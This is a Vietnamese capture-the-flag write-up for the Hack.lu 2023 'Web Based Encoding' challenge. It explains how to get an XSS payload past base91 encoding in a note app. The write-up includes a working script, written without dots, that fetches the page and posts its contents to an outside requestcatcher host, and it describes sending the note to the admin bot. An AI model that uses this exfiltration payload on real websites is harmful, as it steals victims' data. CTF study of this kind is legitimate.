# **Hacklu CTF 2023**

## **Web Based Encoding**

![](./img_Hacklu/Screenshot%202023-10-23%20091408.png)


- Ở đây trang web có chức năng tạo note và thông tin của note sẽ được encode base91. 

- Ý tưởng của tôi đưa ra ở đây để XSS đó là tôi sẽ decode nội dung qua base91 một lần và khi đây trang web sẽ encode lại ra base91 sẽ được script xss.

![](./img_Hacklu/Screenshot%202023-10-23%20093654.png)

- Thực hiện XSS thành công:

![](./img_Hacklu/Screenshot%202023-10-23%20093820.png)

- Điều chúng ta chú ý ở đây là trong bảng `base91_alphabet` không có kí tự `'.'` nên khi encode dấu `.` sẽ được loại bỏ.

![](./img_Hacklu/Screenshot%202023-10-23%20094313.png)


- Vậy chúng ta cần viết một script fetch không có dấu chấm.

```javascript
<script>
fetch("/")
    ["then"](x => x["text"]())
    ["then"](x => fetch("https://ujha77wx"+String["fromCharCode"](46)+"requestcatcher"+String["fromCharCode"](46)+"com/", {
        method: "post",
        body: x
    }))
</script>aaa

```

![](./img_Hacklu/Screenshot%202023-10-23%20094938.png)

- Từ đấy, ta sẽ xss và gửi report lên admin.

![](./img_Hacklu/Screenshot%202023-10-23%20095400.png)

![](./img_Hacklu/Screenshot%202023-10-23%20095440.png)